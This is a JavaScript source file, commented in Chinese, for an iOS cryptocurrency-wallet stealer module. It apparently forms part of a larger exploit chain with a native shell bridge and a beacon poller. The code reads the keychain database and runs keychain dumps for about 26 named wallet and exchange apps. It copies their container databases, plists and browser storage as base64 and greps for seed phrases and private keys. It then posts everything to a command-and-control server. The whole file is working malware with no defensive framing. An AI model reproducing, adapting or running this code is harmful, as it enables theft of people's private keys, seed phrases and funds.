/**
 * wallet_harvest.js — 加密货币钱包私钥+助记词收割模块 (iOS 18.6.2)
 * ==================================================================
 * 加载时机: native_bridge.js 就绪后, beacon_poll.js 之前
 * 依赖: globalThis.nativeExecShell (由 native_bridge.js 提供)
 * 目标: 提取20+主流iOS加密钱包的私钥和助记词明文
 *
 * 收割策略:
 *   1. Keychain 直接读取 (sqlite3 keychain-2.db + security CLI)
 *   2. 钱包容器数据库 (.sqlite/.realm/.dat) 扫助记词/BIP39
 *   3. UserDefaults plist 扫残留明文
 *   4. 文件系统 grep 匹配私钥正则/助记词模式
 * ==================================================================
 */
(function () {
  "use strict";

  var C2 = "http://[REDACTED_IP]:[PORT]";
  var DEVICE_ID = (typeof globalThis !== "undefined" && globalThis._GHB_DEVICE_ID) || "unknown";
  var RESULTS = { wallet: {}, keychain: [], files: [], mnemonic: [], private_keys: [], errors: [], ts: Date.now() };

  function log(msg) {
    try { new Image().src = C2 + "/chain_log?t=wallet:" + encodeURIComponent(String(msg).slice(0, 200)) + "&r=" + Date.now(); } catch (e) {}
  }

  function report() {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", C2 + "/cmd/result", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({
        cmdId: "wallet_harvest_" + Date.now(),
        deviceId: DEVICE_ID,
        type: "wallet_harvest",
        output: JSON.stringify(RESULTS),
        status: "done",
        ts: Date.now()
      }));
    } catch (e) { log("report_err: " + e.message); }
  }

  // BIP39 词表 (前50个高频词用于快速匹配)
  var BIP39 = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
    "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
    "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
    "adult","advance","advice","aerobic","affair","afford","afraid","africa","after","again",
    "age","agent","agree","ahead","aim","air","airport","aisle","alarm","album"];

  var WALLETS = {
    "com.sixdays.trustapp": "Trust Wallet",
    "io.metamask.MetaMask": "MetaMask",
    "org.toshi.Toshi": "Coinbase Wallet",
    "com.phantom.phantom": "Phantom",
    "com.exodus.mobile": "Exodus",
    "com.blockchain.ios": "Blockchain.com",
    "me.rainbow.rainbow": "Rainbow",
    "io.zerion.zerion": "Zerion",
    "com.uniswap.mobile": "Uniswap",
    "com.binance.gmbh.Binance": "Binance",
    "com.okex.okchain": "OKX",
    "com.bybit.bybit": "Bybit",
    "com.bitget.exchange": "Bitget",
    "com.kucoin.KuCoin": "KuCoin",
    "com.gate.gateio": "Gate.io",
    "com.crypto.exchange": "Crypto.com",
    "finance.brd.bread": "BRD",
    "com.mycelium.wallet": "Mycelium",
    "io.bluewallet.bluewallet": "BlueWallet",
    "com.bitpie.bitpie": "Bitpie",
    "im.token.app": "imToken",
    "com.tokenlon.ios": "Tokenlon",
    "one.mixin.ios": "Mixin",
    "com.alpha.wallet": "AlphaWallet",
    "io.metamask.MetaMask.extension": "MetaMask Extension",
    "com.coinbase.ios.wallet": "Coinbase (new)"
  };

  var PRIVKEY_PATTERNS = [
    /[0-9a-fA-F]{64}/g,
    /5[HJK][1-9A-HJ-NP-Za-km-z]{49,51}/g,
    /[KL][1-9A-HJ-NP-Za-km-z]{51,52}/g,
    /0x[0-9a-fA-F]{64}/g,
    /[0-9a-fA-F]{128}/g,
    /xprv[A-Za-z0-9]{107,108}/g,
    /xpub[A-Za-z0-9]{107,108}/g,
    /zprv[A-Za-z0-9]{107,108}/g,
    /zpub[A-Za-z0-9]{107,108}/g,
    /yprv[A-Za-z0-9]{107,108}/g,
    /tprv[A-Za-z0-9]{107,108}/g,
    /L[1-9A-HJ-NP-Za-km-z]{52}/g,
    /S[1-9A-HJ-NP-Za-km-z]{51,52}/g,
    /(?:private.?key|privkey|secret|seed).{0,30}[0-9a-fA-F]{64}/gi,
    /(?:mnemonic|phrase|recovery).{0,50}([a-z]{2,8}\s){11,23}[a-z]{2,8}/gi
  ];

  var sh = (typeof globalThis !== "undefined" && globalThis.nativeExecShell) || null;

  function exec(cmd) {
    if (!sh) { RESULTS.errors.push("nativeExecShell not available: " + cmd.slice(0, 80)); return ""; }
    try {
      var out = sh(cmd);
      if (out === null || out === undefined) return "";
      return String(out);
    } catch (e) {
      RESULTS.errors.push("exec failed: " + e.message + " | cmd: " + cmd.slice(0, 80));
      return "";
    }
  }

  function b64(str) {
    try { return btoa(unescape(encodeURIComponent(str))); } catch (e) { return ""; }
  }

  function harvestKeychain() {
    log("harvest_keychain_start");
    var kcDb = "/private/var/Keychains/keychain-2.db";
    var bundles = Object.keys(WALLETS);

    for (var b = 0; b < bundles.length; b++) {
      var bid = bundles[b];
      var sql = "SELECT agrp, svce, acct, labl, data, cdat, mdat, pdmn FROM genp WHERE agrp LIKE '%" + bid + "%' OR svce LIKE '%" + bid + "%' LIMIT 100";
      var out = exec('sqlite3 "' + kcDb + "\" '" + sql + "' 2>/dev/null");
      if (out && out.trim()) {
        RESULTS.keychain.push({ bundle_id: bid, wallet: WALLETS[bid], type: "genp", raw: out.slice(0, 8192), b64: b64(out.slice(0, 4096)) });
        log("kc_genp: " + bid + " len=" + out.length);
      }

      var sql2 = "SELECT agrp, svce, acct, labl, data, cdat, mdat, pdmn FROM inet WHERE agrp LIKE '%" + bid + "%' OR svce LIKE '%" + bid + "%' LIMIT 100";
      var out2 = exec('sqlite3 "' + kcDb + "\" '" + sql2 + "' 2>/dev/null");
      if (out2 && out2.trim()) {
        RESULTS.keychain.push({ bundle_id: bid, wallet: WALLETS[bid], type: "inet", raw: out2.slice(0, 8192), b64: b64(out2.slice(0, 4096)) });
        log("kc_inet: " + bid + " len=" + out2.length);
      }
    }

    var secOut = exec("security dump-keychain -d /private/var/Keychains/keychain-2.db 2>/dev/null | head -c 65536");
    if (secOut && secOut.trim()) {
      RESULTS.keychain.push({ bundle_id: "*", wallet: "ALL", type: "security_dump", raw: secOut.slice(0, 16384), b64: b64(secOut.slice(0, 8192)) });
      log("security_dump len=" + secOut.length);
    }
    log("harvest_keychain_done: " + RESULTS.keychain.length + " entries");
  }

  function harvestContainers() {
    log("harvest_containers_start");
    var containersBase = "/private/var/mobile/Containers/Data/Application";
    var bundles = Object.keys(WALLETS);

    for (var b = 0; b < bundles.length; b++) {
      var bid = bundles[b];
      var name = WALLETS[bid];

      var findCmd = "find " + containersBase + " -maxdepth 4 -name '.com.apple.mobile_container_manager.metadata.plist' -exec grep -l '" + bid + "' {} \\; 2>/dev/null | head -3";
      var metaFiles = exec(findCmd);
      if (!metaFiles || !metaFiles.trim()) continue;

      var paths = metaFiles.trim().split("\n");
      for (var p = 0; p < paths.length; p++) {
        var metaPath = paths[p].trim();
        if (!metaPath) continue;
        var contDir = metaPath.replace("/.com.apple.mobile_container_manager.metadata.plist", "");
        RESULTS.wallet[bid] = RESULTS.wallet[bid] || { name: name, containers: [], files: [], strings: [] };
        RESULTS.wallet[bid].containers.push(contDir);
        log("found: " + bid + " -> " + contDir);

        var dbExts = [".sqlite", ".sqlite3", ".db", ".realm", ".dat", ".wallet", ".vault", ".keystore", ".json"];
        for (var e = 0; e < dbExts.length; e++) {
          var findDb = "find '" + contDir + "' -type f -name '*" + dbExts[e] + "' 2>/dev/null | head -10";
          var dbFiles = exec(findDb);
          if (!dbFiles || !dbFiles.trim()) continue;
          var dbs = dbFiles.trim().split("\n");
          for (var d = 0; d < dbs.length; d++) {
            var dbPath = dbs[d].trim();
            if (!dbPath) continue;
            var sz = exec("wc -c < '" + dbPath + "' 2>/dev/null").trim();
            var raw = exec("cat '" + dbPath + "' 2>/dev/null | base64 | head -c 65536");
            RESULTS.wallet[bid].files.push({ path: dbPath, size: sz, b64: raw ? raw.slice(0, 32768) : "" });
            log("file: " + dbPath + " sz=" + sz);
          }
        }

        var findPlist = "find '" + contDir + "' -type f -name '*.plist' 2>/dev/null | head -20";
        var plists = exec(findPlist);
        if (plists && plists.trim()) {
          var pl = plists.trim().split("\n");
          for (var pi = 0; pi < pl.length; pi++) {
            var pp = pl[pi].trim();
            if (!pp) continue;
            var plRaw = exec("plutil -convert json -o - '" + pp + "' 2>/dev/null | head -c 32768");
            if (plRaw && plRaw.trim()) {
              RESULTS.wallet[bid].files.push({ path: pp, type: "plist_json", data: plRaw.slice(0, 16384), b64: b64(plRaw.slice(0, 8192)) });
            }
          }
        }

        var grepCmd = "grep -rI -E '\\(mnemonic\\|seed\\|private.key\\|secret\\|recovery\\|phrase\\)' '" + contDir + "' 2>/dev/null | head -c 32768";
        var grepped = exec(grepCmd);
        if (grepped && grepped.trim()) {
          RESULTS.wallet[bid].strings.push({ type: "grep_keywords", data: grepped.slice(0, 16384) });
        }
      }
    }
    log("harvest_containers_done: " + Object.keys(RESULTS.wallet).length + " wallets found");
  }

  function scanMnemonics() {
    log("scan_mnemonics_start");
    var cmd = "find /private/var/mobile/Containers -type f \\( -name '*.txt' -o -name '*.json' -o -name '*.plist' -o -name '*.sqlite' -o -name '*.dat' -o -name '*.log' \\) -exec grep -rI -E '\\b([a-z]{2,10}\\s){11}[a-z]{2,10}\\b' {} \\; 2>/dev/null | head -c 49152";
    var mnemOut = exec(cmd);
    if (mnemOut && mnemOut.trim()) {
      RESULTS.mnemonic.push({ method: "grep_bip39", raw: mnemOut.slice(0, 24576), b64: b64(mnemOut.slice(0, 12288)) });
      log("mnemonic_found: len=" + mnemOut.length);
    }

    var walletDataPaths = [
      "/private/var/mobile/Containers/Data/Application/*/Documents/*.json",
      "/private/var/mobile/Containers/Data/Application/*/Library/Preferences/*.plist",
      "/private/var/mobile/Containers/Data/Application/*/Library/Application Support/*/wallet*",
      "/private/var/mobile/Containers/Shared/AppGroup/*/wallet*"
    ];
    for (var w = 0; w < walletDataPaths.length; w++) {
      var out = exec("ls " + walletDataPaths[w] + " 2>/dev/null | head -20");
      if (out && out.trim()) {
        RESULTS.files.push({ glob: walletDataPaths[w], listing: out.trim().slice(0, 4096) });
      }
    }

    var pkCmd = "find /private/var/mobile/Containers -type f \\( -name '*.txt' -o -name '*.json' -o -name '*.plist' -o -name '*.sqlite' \\) -exec grep -rI -o -E '\\b([0-9a-fA-F]{64}|5[HJK][1-9A-HJ-NP-Za-km-z]{49,51}|[KL][1-9A-HJ-NP-Za-km-z]{51,52})\\b' {} \\; 2>/dev/null | head -c 32768";
    var pkOut = exec(pkCmd);
    if (pkOut && pkOut.trim()) {
      RESULTS.private_keys.push({ method: "grep_regex", raw: pkOut.slice(0, 16384), b64: b64(pkOut.slice(0, 8192)) });
      log("privkey_found: len=" + pkOut.length);
    }
    log("scan_mnemonics_done");
  }

  function harvestAppGroups() {
    log("harvest_appgroups_start");
    var agBase = "/private/var/mobile/Containers/Shared/AppGroup";
    var lsOut = exec("ls " + agBase + " 2>/dev/null");
    if (!lsOut || !lsOut.trim()) return;

    var dirs = lsOut.trim().split("\n");
    for (var d = 0; d < dirs.length; d++) {
      var agDir = agBase + "/" + dirs[d].trim();
      if (!dirs[d].trim() || dirs[d].charAt(0) === ".") continue;

      var metaPath = agDir + "/.com.apple.mobile_container_manager.metadata.plist";
      var meta = exec("plutil -convert json -o - '" + metaPath + "' 2>/dev/null | head -c 4096");
      var bundles = Object.keys(WALLETS);
      for (var b = 0; b < bundles.length; b++) {
        if (meta.indexOf(bundles[b]) !== -1) {
          RESULTS.wallet[bundles[b]] = RESULTS.wallet[bundles[b]] || { name: WALLETS[bundles[b]], containers: [], files: [], strings: [] };
          RESULTS.wallet[bundles[b]].containers.push(agDir);
          log("appgroup: " + bundles[b] + " -> " + agDir);

          var findFiles = "find '" + agDir + "' -type f \\( -name '*.sqlite' -o -name '*.json' -o -name '*.realm' -o -name '*.db' -o -name '*.plist' \\) 2>/dev/null | head -20";
          var files = exec(findFiles);
          if (files && files.trim()) {
            var fl = files.trim().split("\n");
            for (var f = 0; f < fl.length; f++) {
              var fp = fl[f].trim();
              if (!fp) continue;
              var raw = exec("cat '" + fp + "' 2>/dev/null | base64 | head -c 32768");
              var sz = exec("wc -c < '" + fp + "' 2>/dev/null").trim();
              RESULTS.wallet[bundles[b]].files.push({ path: fp, size: sz, b64: raw ? raw.slice(0, 16384) : "" });
            }
          }
          break;
        }
      }
    }
    log("harvest_appgroups_done");
  }

  function harvestWebStorage() {
    log("harvest_webstorage_start");
    var safariBase = "/private/var/mobile/Containers/Data/Application/*/Library/Safari/LocalStorage";
    var lsFiles = exec("find " + safariBase + " -type f -name '*.localstorage' -exec strings {} \\; 2>/dev/null | grep -iE '(wallet|metamask|trust|coinbase|phantom|seed|mnemonic|private)' | head -c 32768");
    if (lsFiles && lsFiles.trim()) {
      RESULTS.files.push({ source: "safari_localstorage", data: lsFiles.slice(0, 16384), b64: b64(lsFiles.slice(0, 8192)) });
      log("safari_ls: len=" + lsFiles.length);
    }

    var idbBase = "/private/var/mobile/Containers/Data/Application/*/Library/WebKit/WebsiteData/IndexedDB";
    var idbFiles = exec("find " + idbBase + " -type f 2>/dev/null | head -30");
    if (idbFiles && idbFiles.trim()) {
      var idbList = idbFiles.trim().split("\n");
      for (var i = 0; i < idbList.length; i++) {
        var fp = idbList[i].trim();
        if (!fp) continue;
        var raw = exec("cat '" + fp + "' 2>/dev/null | base64 | head -c 32768");
        if (raw && raw.trim()) {
          RESULTS.files.push({ source: "indexeddb", path: fp, b64: raw.slice(0, 16384) });
        }
      }
    }
    log("harvest_webstorage_done");
  }

  function run() {
    log("wallet_harvest_init");
    var startTs = Date.now();

    if (!sh) {
      if (typeof globalThis !== "undefined" && globalThis.nativeExecShell) {
        sh = globalThis.nativeExecShell;
      } else {
        log("waiting for nativeExecShell...");
        setTimeout(run, 2000);
        return;
      }
    }

    log("wallet_harvest_executing");

    try { harvestKeychain(); } catch (e) { RESULTS.errors.push("keychain: " + e.message); }
    try { harvestContainers(); } catch (e) { RESULTS.errors.push("containers: " + e.message); }
    try { harvestAppGroups(); } catch (e) { RESULTS.errors.push("appgroups: " + e.message); }
    try { scanMnemonics(); } catch (e) { RESULTS.errors.push("mnemonics: " + e.message); }
    try { harvestWebStorage(); } catch (e) { RESULTS.errors.push("webstorage: " + e.message); }

    RESULTS.duration_ms = Date.now() - startTs;
    RESULTS.device_id = DEVICE_ID;
    RESULTS.wallet_count = Object.keys(RESULTS.wallet).length;
    RESULTS.keychain_count = RESULTS.keychain.length;
    RESULTS.mnemonic_count = RESULTS.mnemonic.length;
    RESULTS.privkey_count = RESULTS.private_keys.length;

    log("wallet_harvest_done: wallets=" + RESULTS.wallet_count + " kc=" + RESULTS.keychain_count + " mn=" + RESULTS.mnemonic_count + " pk=" + RESULTS.privkey_count + " dur=" + RESULTS.duration_ms + "ms");

    report();

    try { exec("echo '" + JSON.stringify(RESULTS).replace(/'/g, "'\\''").slice(0, 32768) + "' > /var/tmp/.wallet_harvest_result.json 2>/dev/null"); } catch (e) {}
  }

  if (typeof globalThis !== "undefined" && globalThis.beaconPoll) {
    setTimeout(run, 3000);
  } else {
    var checkCount = 0;
    var checkInterval = setInterval(function () {
      checkCount++;
      if ((typeof globalThis !== "undefined" && globalThis.beaconPoll) || checkCount > 30) {
        clearInterval(checkInterval);
        setTimeout(run, 2000);
      }
    }, 1000);
  }

  if (typeof globalThis !== "undefined") {
    globalThis.walletHarvest = run;
  }
})();
